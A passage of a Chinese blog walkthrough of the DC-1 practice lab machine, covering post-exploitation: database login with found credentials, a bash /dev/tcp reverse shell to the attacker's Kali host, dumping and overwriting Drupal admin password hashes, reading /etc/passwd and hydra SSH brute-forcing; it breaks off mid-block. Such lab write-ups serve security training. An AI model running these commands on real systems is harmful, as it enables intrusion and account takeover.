title="0x06.登入数据库"></a>0x06.登入数据库</h2><p><code>由于meterpreter不能进行mysql登入，所以进入到常规shell下，发现3306是开放的，并且只允许本地连接</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3903 created.</span><br><span class="line">Channel 7 created.</span><br><span class="line">netstat -apntu</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:41087           0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 192.168.1.3:52082       192.168.1.6:4444        ESTABLISHED 3837/php        </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 ::1:25                  :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::111                  :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::36531                :::*                    LISTEN      -               </span><br><span class="line">tcp6       1      0 192.168.1.3:80          192.168.1.6:40931       CLOSE_WAIT  -               </span><br><span class="line">udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:49260           0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:783             0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 127.0.0.1:815           0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:50997           0.0.0.0:*                           -               </span><br><span class="line">udp6       0      0 :::48070                :::*                                -               </span><br><span class="line">udp6       0      0 :::111                  :::*                                -   </span><br><span class="line">udp6       0      0 :::62200                :::*                                -               </span><br><span class="line">udp6       0      0 :::783                  :::*                                -         </span><br></pre></td></tr></table></figure><p><code>尝试登入，发现在当前shell下是无法登入的</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>由于这个shell是http方式建立的，不是持久连接，所以下面建立持久连接</code></p><h2 id="0x07-反弹shell"><a href="#0x07-反弹shell" class="headerlink" title="0x07.反弹shell"></a>0x07.反弹shell</h2><p><code>由于需要建立持久连接，所以尝试将DC1的shell反弹给kali</code></p><h3 id="1-kali先监听6666端口"><a href="#1-kali先监听6666端口" class="headerlink" title="1.kali先监听6666端口"></a>1.kali先监听6666端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-DC1执行"><a href="#2-DC1执行" class="headerlink" title="2.DC1执行"></a>2.DC1执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><code>咦，报错了😱换个方法</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3911 created.</span><br><span class="line">Channel 8 created.</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br><span class="line">/bin/sh: 2: Syntax error: Bad fd numbermeterpreter &gt; </span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><code>也不行，我giao</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3915 created.</span><br><span class="line">Channel 10 created.</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1                                                                                                      </span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>再换个方法，此方法为使用python脚本先建立交互shell再反弹shell给kali</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><code>这回成功了，成功建立交互式shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3924 created.</span><br><span class="line">Channel 12 created.</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@DC-1:/var/www$ /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h3 id="3-反弹"><a href="#3-反弹" class="headerlink" title="3.反弹"></a>3.反弹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.3] 51322</span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure><p><code>反弹成功再次登入mysql</code></p><h2 id="0x08-再次登入mysql"><a href="#0x08-再次登入mysql" class="headerlink" title="0x08.再次登入mysql"></a>0x08.再次登入mysql</h2><p><code>然而在反弹给kali的shell不能登陆到mysql（我giao，这是什么原理？？？？？？）</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.3] 51322</span><br><span class="line">www-data@DC-1:/var/www$ mysql -udbuser -pR0ck3t</span><br><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>但是在使用python脚本获得的交互式shell下却可以登入，菜狗一脸问号❓❓❓❓❓❓❓❓❓（我竟然饶了一圈。。。）</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3960 created.</span><br><span class="line">Channel 16 created.</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@DC-1:/var/www$ mysql -udbuser -pR0ck3t</span><br><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 16035</span><br><span class="line">Server version: 5.5.60-0+deb7u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-查看数据库"><a href="#1-查看数据库" class="headerlink" title="1.查看数据库"></a>1.查看数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><h3 id="2-使用drupaldb，查看表"><a href="#2-使用drupaldb，查看表" class="headerlink" title="2.使用drupaldb，查看表"></a>2.使用drupaldb，查看表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use drupaldb     </span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;    </span><br><span class="line">show tables;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| Tables_in_drupaldb          |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| actions                     |</span><br><span class="line">| authmap                     |</span><br><span class="line">| batch                       |</span><br><span class="line">| block                       |</span><br><span class="line">| block_custom                |</span><br><span class="line">| block_node_type             |</span><br><span class="line">| block_role                  |</span><br><span class="line">| blocked_ips                 |</span><br><span class="line">| cache                       |</span><br><span class="line">| cache_block                 |</span><br><span class="line">| cache_bootstrap             |</span><br><span class="line">| cache_field                 |</span><br><span class="line">| cache_filter                |</span><br><span class="line">| cache_form                  |</span><br><span class="line">| cache_image                 |</span><br><span class="line">| cache_menu                  |</span><br><span class="line">| cache_page                  |</span><br><span class="line">| cache_path                  |</span><br><span class="line">| cache_update                |</span><br><span class="line">| cache_views                 |</span><br><span class="line">| cache_views_data            |</span><br><span class="line">| comment                     |</span><br><span class="line">| ctools_css_cache            |</span><br><span class="line">| ctools_object_cache         |</span><br><span class="line">| date_format_locale          |</span><br><span class="line">| date_format_type            |</span><br><span class="line">| date_formats                |</span><br><span class="line">| field_config                |</span><br><span class="line">| field_config_instance       |</span><br><span class="line">| field_data_body             |</span><br><span class="line">| field_data_comment_body     |</span><br><span class="line">| field_data_field_image      |</span><br><span class="line">| field_data_field_tags       |</span><br><span class="line">| field_revision_body         |</span><br><span class="line">| field_revision_comment_body |</span><br><span class="line">| field_revision_field_image  |</span><br><span class="line">| field_revision_field_tags   |</span><br><span class="line">| file_managed                |</span><br><span class="line">| file_usage                  |</span><br><span class="line">| filter                      |</span><br><span class="line">| filter_format               |</span><br><span class="line">| flood                       |</span><br><span class="line">| <span class="built_in">history</span>                     |</span><br><span class="line">| image_effects               |</span><br><span class="line">| image_styles                |</span><br><span class="line">| menu_custom                 |</span><br><span class="line">| menu_links                  |</span><br><span class="line">| menu_router                 |</span><br><span class="line">| node                        |</span><br><span class="line">| node_access                 |</span><br><span class="line">| node_comment_statistics     |</span><br><span class="line">| node_revision               |</span><br><span class="line">| node_type                   |</span><br><span class="line">| queue                       |</span><br><span class="line">| rdf_mapping                 |</span><br><span class="line">| registry                    |</span><br><span class="line">| registry_file               |</span><br><span class="line">| role                        |</span><br><span class="line">| role_permission             |</span><br><span class="line">| search_dataset              |</span><br><span class="line">| search_index                |</span><br><span class="line">| search_node_links           |</span><br><span class="line">| search_total                |</span><br><span class="line">| semaphore                   |</span><br><span class="line">| sequences                   |</span><br><span class="line">| sessions                    |</span><br><span class="line">| shortcut_set                |</span><br><span class="line">| shortcut_set_users          |</span><br><span class="line">| system                      |</span><br><span class="line">| taxonomy_index              |</span><br><span class="line">| taxonomy_term_data          |</span><br><span class="line">| taxonomy_term_hierarchy     |</span><br><span class="line">| taxonomy_vocabulary         |</span><br><span class="line">| url_alias                   |</span><br><span class="line">| users                       |</span><br><span class="line">| users_roles                 |</span><br><span class="line">| variable                    |</span><br><span class="line">| views_display               |</span><br><span class="line">| views_view                  |</span><br><span class="line">| watchdog                    |</span><br><span class="line">+-----------------------------+</span><br><span class="line">80 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><p><code>80张表太过分了！可以看到users表</code></p><h3 id="3-查看users表"><a href="#3-查看users表" class="headerlink" title="3.查看users表"></a>3.查看users表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users\G  //\G表示将表旋转90°</span><br><span class="line">select * from users\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">             uid: 0</span><br><span class="line">            name: </span><br><span class="line">            pass: </span><br><span class="line">            mail: </span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: NULL</span><br><span class="line">         created: 0</span><br><span class="line">          access: 0</span><br><span class="line">           login: 0</span><br><span class="line">          status: 0</span><br><span class="line">        timezone: NULL</span><br><span class="line">        language: </span><br><span class="line">         picture: 0</span><br><span class="line">            init: </span><br><span class="line">            data: NULL</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">             uid: 1</span><br><span class="line">            name: admin</span><br><span class="line">            pass: <span class="variable">$S</span><span class="variable">$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR</span><br><span class="line">            mail: admin@example.com</span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: NULL</span><br><span class="line">         created: 1550581826</span><br><span class="line">          access: 1550583852</span><br><span class="line">           login: 1550582362</span><br><span class="line">          status: 1</span><br><span class="line">        timezone: Australia/Melbourne</span><br><span class="line">        language: </span><br><span class="line">         picture: 0</span><br><span class="line">            init: admin@example.com</span><br><span class="line">            data: b:0;</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line">             uid: 2</span><br><span class="line">            name: Fred</span><br><span class="line">            pass: <span class="variable">$S</span><span class="variable">$DWGrxef6</span>.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg</span><br><span class="line">            mail: fred@example.org</span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: filtered_html</span><br><span class="line">         created: 1550581952</span><br><span class="line">          access: 1550582225</span><br><span class="line">           login: 1550582225</span><br><span class="line">          status: 1</span><br><span class="line">        timezone: Australia/Melbourne</span><br><span class="line">        language: </span><br><span class="line">         picture: 0</span><br><span class="line">            init: fred@example.org</span><br><span class="line">            data: b:0;</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><p><code>可以看到cms的管理用户加密密码，前面flag2提示了，暴力破解不是唯一方法，那么就换一个思路</code></p><h3 id="4-修改覆盖admin密码"><a href="#4-修改覆盖admin密码" class="headerlink" title="4.修改覆盖admin密码"></a>4.修改覆盖admin密码</h3><p><code>用一个新的密码密文将原来的密码覆盖掉，手动生成</code></p><p><code>使用PHP调用scripts/password-hash.sh生成admin的密文</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ php scripts/password-hash.sh admin      </span><br><span class="line">php scripts/password-hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin                 <span class="built_in">hash</span>: <span class="variable">$S</span><span class="variable">$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F</span>.KYKPn.qzT7vbfsg27</span><br><span class="line"></span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure><p><code>覆盖</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set pass&#x3D;&quot;$S$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F.KYKPn.qzT7vbfsg27&quot; where uid&#x3D;1;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use drupaldb;</span><br><span class="line">use drupaldb;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; update users set pass&#x3D;&quot;$S$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F.KYKPn.qzT7vbfsg27&quot; where uid&#x3D;1;</span><br><span class="line">&lt;s&#x3D;&quot;$S$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F.KYKPn.qzT7vbfsg27&quot; where uid&#x3D;1;    </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><h2 id="0x09-登入cms"><a href="#0x09-登入cms" class="headerlink" title="0x09.登入cms"></a>0x09.登入cms</h2><p><code>admin/admin登入</code></p><img src="/2020/08/21/DC-1/image-20200820233740808.png"><p><code>成功登入</code></p><img src="/2020/08/21/DC-1/image-20200820234010015.png"><p><code>点击仪表盘发现flag3</code></p><img src="/2020/08/21/DC-1/image-20200820234207549.png"><p><code>点击flag3</code></p><img src="/2020/08/21/DC-1/image-20200820234432653.png"><p><code>发现线索在passwd中，查看passwd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:104::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:103:107::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure><p><code>结尾发现flag4，并且为/bin/bash，是可以登入的，前文已经发现开启了22端口</code></p><p><code>接下来进行爆破</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment">#hydra -l flag4 -P /usr/share/john/password.lst 192.168.1.6 ssh -vV -f -o hydra.ssh</span></span><br><span class="line">......    //-l用户名，-P字典，-vV为爆破详细信息，-f为如果遇到正确的密码则停止爆破，-o输出文件</span><br><span class="line">......</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;delta&quot;</span> - 137 of 3562 [child 2] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;doctor&quot;</span> - 138 of 3562 [child 8] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;fisher&quot;</span> - 139 of 3562 [child 10] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;island&quot;</span> - 140 of 3562 [child 9] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;john&quot;</span> - 141 of 3562 [child 15] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;joshua&quot;</span> - 142 of 3562 [child 0] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;karen&quot;</span> - 143 of 3562 [child 7] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;marley&quot;</span> - 144 of 3562 [child 1] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;orange&quot;</span> - 145 of 3562 [child 12] (0/3)</span><br><span class="line">[22][ssh] host: 192.168.1.3   login: flag4   password: orange</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.1.3 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-20 11:58:01</span><br><span class="line">root@JIYE:~/tmp/DC1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>破解出密码为orange</code></p><p><code>登入</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 